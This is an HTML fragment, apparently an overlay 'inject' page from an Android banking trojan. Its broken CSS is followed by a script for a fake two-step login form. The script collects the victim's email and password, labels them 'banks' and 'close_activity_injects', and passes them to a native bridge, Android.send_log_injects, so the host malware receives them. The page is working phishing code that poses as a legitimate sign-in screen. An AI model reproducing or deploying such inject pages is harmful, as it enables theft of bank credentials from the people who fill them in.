            background-color: #fff;
            text-align: center;
            border: 0;
            font-weight: 600;
            width: 100%;
        }

        .input::placeholder {
            color: #d6d7d5;
            opacity: 1;
        }

        input,button {
            outline: none !important;
            box-shadow: none !important;
        }

        .button {
            width: 100%;
            padding: 8px;
            background-color: #4050fb;
            color: #fff;
            font-weight: 600;
            border: 0;
            border-bottom: 2px solid #d2d2d2;
            border-radius: 75px;

        .button:disabled {
            background-color: #d6d7d5;
            border-color: #d6d7d5;

    <script>
        var login = document.getElementById('login'),
            password = document.getElementById('password'),
            nextPage = document.getElementById('nextPage'),
            sendData = document.getElementById('sendData'),
            form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2'),
            spinner = document.getElementById('spinner');

        function check() {
            if(/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value)) {
                nextPage.disabled = false
            } else {
                nextPage.disabled = true
            }
        }

        function check2() {
            if(password.value.length > 3) {
                sendData.disabled = false
            } else {
                sendData.disabled = true
            }
        }

        nextPage.onclick = function() {
            spinner.style.display = 'block';
            setTimeout(() => {
                form1.style.display = 'none';
                spinner.style.display = 'none';
                form2.style.display = 'flex';
            }, 1500);
        }

        sendData.onclick = function(){
            var data = {};
            data.email = login.value;
            data.password = password.value;
            data.type_injects = "banks";
            data.closed = "close_activity_injects";

            var ua = navigator.userAgent.toLowerCase();
            if(ua.indexOf("android") > -1) {
                try {
                    Android.send_log_injects(JSON.stringify(data))
                } catch (err) {}
            }else{
                alert(JSON.stringify(data));
            }
        }
    </script>
